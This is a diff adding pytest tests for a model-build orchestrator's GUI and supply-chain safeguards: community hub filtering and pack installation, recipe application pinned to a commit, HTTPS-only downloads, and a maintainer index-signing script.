+    framework = SimpleNamespace(community_manager=world.cm, target_manager=None, secrets_manager=world.secrets)
+    hub = community_hub.CommunityHubWindow(framework, on_build_recipe=built.append)
+    try:
+        wait(hub, qapp)
+        rows = {hub.table.item(r, 0).text(): (hub.table.item(r, 3).text(), hub.table.cellWidget(r, 6).text())
+                for r in range(hub.table.rowCount())}
+        assert rows == {"Demo-Board": ("community", "Install"), "Revoked-Board": ("revoked", "Revoked"),
+                        "demo-recipe": ("local", "Build")}
+        hub.trust_filter.setCurrentIndex(hub.trust_filter.findData("revoked"))
+        assert hub.table.rowCount() == 1
+        hub.trust_filter.setCurrentIndex(0)
+        hub.kind_filter.setCurrentIndex(hub.kind_filter.findData("recipe"))
+        hub.table.cellWidget(0, 6).click()
+        assert built[0].id == "demo-recipe" and built[0].quantization == "Q8_0"
+        hub.kind_filter.setCurrentIndex(hub.kind_filter.findData("target"))
+        installed = []
+        hub.installed.connect(installed.append)
+        next(hub.table.cellWidget(r, 6) for r in range(hub.table.rowCount())
+             if hub.table.cellWidget(r, 6).text() == "Install").click()
+        wait(hub, qapp)
+        assert installed == ["target"] and (world.root / "targets" / "demo-board").is_dir()
+        assert "QInputDialog" not in Path(community_hub.__file__).read_text()
+    finally:
+        hub.close()
+
+
+def test_builder_fills_in_a_recipe_with_its_commit(qapp, booted_framework, monkeypatch):
+    from orchestrator.schemas.recipes import Recipe
+    from test_recipes import recipe_data
+    from test_review_capabilities_paths import make_tab, submit
+    monkeypatch.setattr("orchestrator.gui.builder_tab.QMessageBox.information", lambda *a: None)
+    tab = make_tab(booted_framework)
+    data = recipe_data()
+    data.update(target={"id": "Rockchip", "pack_sha256": "a" * 64}, format="rkllm", board="rk3576",
+                quantization="w4a16")
+    recipe = Recipe.model_validate(data)
+    tab.apply_recipe(recipe)
+    req = submit(tab)
+    assert (req.models, req.targets, req.target_board, req.quantization_options) == (
+        [recipe.model.repo], ["Rockchip"], "rk3576", ["w4a16"])
+    assert req.model_revision == recipe.model.revision
+    tab.model_input.setCurrentText("Qwen/Qwen3.5-0.8B")
+    assert submit(tab).model_revision is None, "another model is not pinned to the recipe's commit"
+
+
+def test_download_helper_get_bytes_is_https_only(tmp_path):
+    from orchestrator.utils.download import DownloadError, PinnedDownloader
+    session = FakeSession()
+    session.files["https://a.invalid/x"] = b"abc"
+    session.redirects["https://a.invalid/x"] = "http://a.invalid/x"
+    with pytest.raises(DownloadError, match="away from HTTPS"):
+        PinnedDownloader(session).get_bytes("https://a.invalid/x", 10)
+    assert session.calls == ["https://a.invalid/x"]
+
+
+def test_maintainer_signing_script(tmp_path, memory_keyring, capsys, world):
+    import importlib.util
+    import yaml
+    from conftest import REPO_ROOT
+    spec = importlib.util.spec_from_file_location("zoo_sign_index", REPO_ROOT / "scripts" / "zoo_sign_index.py")
+    tool = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(tool)
+    assert tool.main(["keygen", "maintainers"]) == 0
+    key = cp.TrustedKey.model_validate(yaml.safe_load(capsys.readouterr().out)[0])
+    assert tool.main(["keygen", "maintainers"]) == 1, "an existing key is never replaced"
+    (tmp_path / "p.zip").write_bytes(world.target_pack())
+    assert tool.main(["entry", str(tmp_path / "p.zip"), "--url", "https://zoo.invalid/p.zip"]) == 0
+    entry = json.loads(capsys.readouterr().out)
+    index = tmp_path / "index.json"
+    index.write_text(json.dumps({"schema_version": 1, "version": 2, "generated": "2026-10-11T12:00:00Z",
+                                 "entries": [entry]}))
+    assert tool.main(["sign", str(index), "--key", "maintainers"]) == 0
+    verified = CommunityManager._verify_index(index.read_bytes(), (tmp_path / "index.json.sig").read_bytes(), [key])
+    assert verified.entries[0].sha256 == cp.hashlib.sha256((tmp_path / "p.zip").read_bytes()).hexdigest()
+    assert tool.main(["sign", str(index), "--key", "maintainers", "--previous", str(index)]) == 1
